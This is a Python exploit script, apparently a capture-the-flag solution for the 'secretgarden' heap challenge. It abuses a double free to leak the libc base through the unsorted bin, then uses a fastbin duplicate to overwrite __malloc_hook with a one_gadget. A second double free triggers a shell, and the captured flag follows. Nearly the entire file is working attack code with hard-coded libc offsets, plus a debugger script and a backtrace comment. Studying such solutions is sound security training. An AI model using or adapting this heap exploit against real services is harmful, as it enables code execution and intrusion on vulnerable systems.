#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./secretgarden_patched', checksec=False)
libc = ELF('./libc_64.so.6', checksec=False)

gdbscript = '''
init-pwndbg
# init-gef-bata
file ./secretgarden_patched
brva 0x0cd3
brva 0x0c65
brva 0x0e74
b *__strdup
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def create(size,name,color):
    sla(b'choice : ',b'1')
    slna(b'name :',size)
    sa(b'flower :',name)
    sla(b'flower :',color)

def show():
    sla(b'choice : ',b'2')

def delete(idx):
    sla(b'choice : ',b'3')
    slna(b'garden:',idx)

# ==================== EXPLOIT ====================
p = start()

# Bug: Double free in delete() function --> Leak via unsorted bin --> Fast bin duplicate to overwrite __malloc_hook with one_gadget --> Trigger via double free check
create(0x450, b'0' * 0x10, b'0' * 0x8)
create(0x20, b'1' * 0x10, b'1' * 0x8)
delete(0)

create(0x68, b'2' * 0x8, b'2' * 0x8) # 2
show()

ru(b'Name of the flower[2] :')
ru(b'2' * 0x8)
libc.address = u64(rl()[:-1].ljust(0x8, b'\x00')) - 0x3c3b78
slog('libc base @ %#x', libc.address)

malloc_hook = libc.address + 0x3c3b10
og = libc.address + 0xef6c4
info('malloc_hook @ %#x', malloc_hook)
info('one_gadget @ %#x', og)

create(0x68, b'3' * 0x8, b'3' * 0x8)

delete(2)
delete(3)
delete(2)

# Overwrite fd pointer of the freed chunk to point to __malloc_hook - 35
# We subtract 35 because there is a size check in fast bin
create(0x68, p64(malloc_hook - 35), b'4' * 0x8)
create(0x68, b'5' * 0x8, b'5' * 0x8)
create(0x68, b'6' * 0x8, b'6' * 0x8)

# Overwrite __malloc_hook with one_gadget
create(0x68, b'\x00'*3 + p64(0)*2 + p64(og), b'mmb')

if args.GDB:
    gdb.attach(p, gdbscript=gdbscript)
    sleep(1)

'''
Abuse double free to trigger malloc_printerr, the backtrace below:
> Yes yes I know, somehow I can't do create directly and need to trigger this way :(

#0  0x00007866629dca80 in malloc@plt () from ./ld-linux-x86-64.so.2
#1  0x00007866629f8d8a in __strdup (s=0x7ffe67ecee80 "/lib/x86_64-linux-gnu/libgcc_s.so.1") at strdup.c:42
#2  0x00007866629f460f in _dl_load_cache_lookup (name=name@entry=0x78666279eaa6 "libgcc_s.so.1") at dl-cache.c:311
#3  0x00007866629e4f99 in _dl_map_object (loader=loader@entry=0x786662c00510, name=name@entry=0x78666279eaa6 "libgcc_s.so.1", type=type@entry=2, trace_mode=trace_mode@entry=0, mode=mode@entry=-1879048191,
    nsid=<optimized out>) at dl-load.c:2342
#4  0x00007866629f13a7 in dl_open_worker (a=a@entry=0x7ffe67ecf570) at dl-open.c:237
#5  0x00007866629ec394 in _dl_catch_error (objname=objname@entry=0x7ffe67ecf560, errstring=errstring@entry=0x7ffe67ecf568, mallocedp=mallocedp@entry=0x7ffe67ecf55f, operate=operate@entry=0x7866629f1300 <dl_open_worker>,
    args=args@entry=0x7ffe67ecf570) at dl-error.c:187
#6  0x00007866629f0bd9 in _dl_open (file=0x78666279eaa6 "libgcc_s.so.1", mode=-2147483647, caller_dlopen=0x786662727fd1 <__GI___backtrace+193>, nsid=-2, argc=<optimized out>, argv=<optimized out>, env=0x7ffe67ed02a8)
    at dl-open.c:660
#7  0x00007866627559bd in do_dlopen (ptr=ptr@entry=0x7ffe67ecf790) at dl-libc.c:87
#8  0x00007866629ec394 in _dl_catch_error (objname=0x7ffe67ecf780, errstring=0x7ffe67ecf788, mallocedp=0x7ffe67ecf77f, operate=0x786662755980 <do_dlopen>, args=0x7ffe67ecf790) at dl-error.c:187
#9  0x0000786662755a74 in dlerror_run (args=0x7ffe67ecf790, operate=0x786662755980 <do_dlopen>) at dl-libc.c:46
#10 __GI___libc_dlopen_mode (name=name@entry=0x78666279eaa6 "libgcc_s.so.1", mode=mode@entry=-2147483647) at dl-libc.c:163
#11 0x0000786662727fd1 in init () at ../sysdeps/x86_64/backtrace.c:52
#12 __GI___backtrace (array=array@entry=0x7ffe67ecf7f0, size=size@entry=64) at ../sysdeps/x86_64/backtrace.c:105
#13 0x00007866626329f5 in backtrace_and_maps (do_abort=<optimized out>, do_abort@entry=2, written=<optimized out>, fd=fd@entry=3) at ../sysdeps/unix/sysv/linux/libc_fatal.c:47
#14 0x000078666268a7e5 in __libc_message (do_abort=do_abort@entry=2, fmt=fmt@entry=0x7866627a32e0 "*** Error in `%s': %s: 0x%s ***\n") at ../sysdeps/posix/libc_fatal.c:172
#15 0x0000786662692e0a in malloc_printerr (ar_ptr=<optimized out>, ptr=<optimized out>, str=0x7866627a33a8 "double free or corruption (fasttop)", action=3) at malloc.c:5004
#16 _int_free (av=<optimized out>, p=<optimized out>, have_lock=0) at malloc.c:3865
#17 0x000078666269698c in __GI___libc_free (mem=<optimized out>) at malloc.c:2966
'''
delete(0)
delete(0)

interactive()
# FLAG{FastBiN_C0rruption_t0_BUrN_7H3_G4rd3n}
